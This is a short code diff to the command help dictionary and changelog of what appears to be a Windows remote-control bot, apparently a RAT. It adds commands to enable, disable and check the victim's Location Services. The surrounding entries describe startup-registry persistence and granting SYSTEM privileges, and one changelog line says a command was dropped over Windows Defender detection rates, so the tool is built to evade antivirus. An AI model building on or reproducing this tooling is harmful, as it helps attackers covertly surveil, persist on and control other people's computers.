@@ -64,10 +64,22 @@ const helpDict = {
   "addstartup": { "explanation": "Adds a given file to startup registry.", "category": "Utility" },
   "system": { "explanation": "Check if we have System privileges. NT Authority System", "category": "Utility" },
   "givesystem": { "explanation": "Grants us System Privileges", "category": "Utility" },
+  "enableloc": { "explanation": "Enables Location Services", "category": "Utility" },
+  "disableloc": { "explanation": "Disables Location Services", "category": "Utility" },
+  "checkloc": { "explanation": "Checks if Location Services are enabled", "category": "Utility" },
 };
 
 /* ======= Changelog (multi-line, English) ======= */
 const changelog = [
+  { v: "v8.3", note: [
+    "Added !enableloc",
+    "Enables Location Services",
+    "Added !disableloc",
+    "Disables Location Services",
+    "Added !checkloc",
+    "Checks the Status of Location Services"
+    ].join("\n")
+  },
     { v: "v8.3", note: [
     "Removed !hidetask",
     "Due to high detection rates from Windows Defender",
